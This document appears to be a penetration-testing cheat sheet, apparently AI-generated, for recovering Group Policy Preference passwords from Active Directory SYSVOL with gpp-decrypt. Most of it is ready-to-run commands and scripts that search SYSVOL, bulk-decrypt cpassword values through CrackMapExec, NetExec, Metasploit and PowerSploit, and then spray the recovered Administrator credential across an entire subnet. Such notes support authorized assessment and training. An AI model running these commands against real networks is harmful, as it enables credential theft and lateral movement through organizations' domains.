# gpp-decrypt

**Tags:** `#gppdecrypt` `#grouppolicy` `#activedirectory` `#credentialdumping` `#windows` `#sysvol`

Decrypts passwords stored in Group Policy Preference (GPP) XML files. Microsoft published the AES-256 key used to encrypt `cpassword` values in GPP files in 2012 — it's hardcoded and public knowledge. Any domain user can read SYSVOL, so any `cpassword` value found there can be decrypted. Patched in MS14-025 but legacy GPP files persist in SYSVOL for years.

**Source:** pre-installed on Kali (`gpp-decrypt`)
**MS14-025:** https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025

```bash
gpp-decrypt <cpassword-value>
```

> [!note] **Why this still works** — MS14-025 prevents creating *new* GPP passwords but doesn't remove existing ones from SYSVOL. Files from before the patch date still exist in many environments. Always check SYSVOL — credentials found here are often reused for local admin, service accounts, or domain users.

---

## Finding GPP Files

GPP XML files live in SYSVOL and are readable by all domain users.

```bash
# From Linux — mount SYSVOL and search
smbclient //DC01/SYSVOL -U 'DOMAIN\user%Password'
# Then: recurse on; ls; get <file>

# Find via smbclient — search for XML files containing cpassword
smbclient //DC01/SYSVOL -U 'DOMAIN\user%Password' -c 'recurse;ls' 2>/dev/null | grep -i ".xml"

# From Linux with credentials — use find via mount
mount -t cifs //DC01/SYSVOL /mnt/sysvol -o username=user,password=Password,domain=DOMAIN
find /mnt/sysvol -name "*.xml" | xargs grep -l "cpassword" 2>/dev/null

# CrackMapExec — auto-find and decrypt GPP passwords
crackmapexec smb <dc-ip> -u user -p Password -M gpp_password
crackmapexec smb <dc-ip> -u user -p Password -M gpp_autologin

# NetExec
netexec smb <dc-ip> -u user -p Password -M gpp_password
netexec smb <dc-ip> -u user -p Password -M gpp_autologin

# Metasploit
use post/windows/gather/credentials/gpp
```

```powershell
# From Windows — search SYSVOL directly
Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Include "*.xml" -ErrorAction SilentlyContinue |
  Select-String -Pattern "cpassword" | Select-Object Path

# PowerSploit — Get-GPPPassword (also checks NETLOGON)
Get-GPPPassword
Get-GPPPassword -Server <dc>
```

---

## Decrypting the Password

```bash
# Decrypt a single cpassword value
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

# Output: plaintext password

# From file — extract and decrypt all cpassword values
grep -oP 'cpassword="\K[^"]+' Groups.xml | while read hash; do
    echo "$hash → $(gpp-decrypt "$hash")"
done
```

---

## Common GPP File Locations & Types

| File | Contains |
|---|---|
| `Groups.xml` | Local group membership + credentials |
| `Services.xml` | Service account credentials |
| `ScheduledTasks.xml` | Scheduled task run-as credentials |
| `DataSources.xml` | Database connection strings |
| `Drives.xml` | Drive mapping credentials |
| `Printers.xml` | Printer connection credentials |

```bash
# Search all common GPP file types at once
find /mnt/sysvol -name "Groups.xml" -o -name "Services.xml" \
  -o -name "ScheduledTasks.xml" -o -name "DataSources.xml" \
  -o -name "Drives.xml" -o -name "Printers.xml" 2>/dev/null | \
  xargs grep -l "cpassword" 2>/dev/null
```

---

## What a GPP XML Looks Like

```xml
<!-- Groups.xml example -->
<Groups>
  <User clsid="{...}" name="Administrator" ...>
    <Properties action="U" newName="" fullName="" description=""
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="Administrator"/>
  </User>
</Groups>
```

```bash
# Extract all relevant fields from a GPP XML
python3 - <<'EOF'
import xml.etree.ElementTree as ET, subprocess, sys

tree = ET.parse('Groups.xml')
for elem in tree.iter():
    cp = elem.get('cpassword')
    user = elem.get('userName') or elem.get('username') or elem.get('name')
    if cp:
        result = subprocess.run(['gpp-decrypt', cp], capture_output=True, text=True)
        print(f"User: {user}")
        print(f"Password: {result.stdout.strip()}")
        print()
EOF
```

---

## Post-Decryption

```bash
# Test decrypted credential against domain
crackmapexec smb <dc-ip> -u Administrator -p '<decrypted-password>' --local-auth
crackmapexec smb 192.168.1.0/24 -u Administrator -p '<decrypted-password>' --local-auth

# Test against domain (not local)
crackmapexec smb <dc-ip> -u Administrator -p '<decrypted-password>' -d DOMAIN

# If it's a service account — check what it has access to
crackmapexec smb <subnet>/24 -u <service-acct> -p '<password>' -d DOMAIN
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
